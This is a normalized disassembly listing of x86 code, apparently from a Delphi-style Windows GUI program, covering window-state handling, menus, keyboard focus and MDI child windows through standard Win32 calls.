cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_4482a0
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_455d94
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_431cc4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_455d94
jmp r-xdata
sub_4510a0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403324
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4510e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c7c0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45110c
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4508cc
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_431a9c
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_451164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a4c8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454748
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403324
sub_4511f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43b390
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43b390
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451288
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b390
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_450868
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403324
sub_4512e0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43b8c4
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45130c
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4508cc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_451328
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_4482d0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4482d0
sub_451368
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4513a0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ecc
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4513d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_451525
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45152c
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_451328
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_431a40
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41245c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_4346cc
lea eax [ ebp - 0x1c ]
call sub_40688c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_451328
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_451368
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_455a38
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_455aa0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_455aa0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4513a0
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41245c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_4346cc
lea eax [ ebp - 0x1c ]
call sub_40688c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4559d0
test [ esi + 0x228 ] 0x8
je r-xdata
sub_451534
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_4515a8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4515d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43992c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f5e4
lea edx [ ebp - 0x14 ]
call sub_452dac
push ebp
mov eax [ ebp - 0x4 ]
call sub_44f5e4
lea edx [ ebp - 0x24 ]
call sub_452dac
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_4515a8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44f5e4
lea edx [ ebp - 0x24 ]
call sub_452dac
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4515a8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4515a8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4515a8
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45168c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403324
pop esi
pop ebx
retn
sub_4516b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403324
pop esi
pop ebx
retn
sub_4516d4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43a80c
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43b8c4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43b8c4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_451770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451cda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_455e84
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_451cbd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451cc4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
push ebp
push j_sub_4035c8#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4035c8#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45091c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4388e8
jmp r-xdata
mov eax [ rw-data ]
call sub_453008
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b390
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_452ffc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
call sub_44c488
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_453038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_453008
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_434e14
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45302c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_452ffc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44fbcc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44fbcc
jmp r-xdata
sub_45182d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_455598
call sub_403930
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_453008
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_452ffc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_453038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_453008
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451cc4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_434e14
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45302c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4345fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_452ffc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44fbcc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44fbcc
jmp r-xdata
sub_451bc9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_455598
call sub_403930
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45091c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4388e8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b390
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451cc4
mov eax [ ebp - 0x4 ]
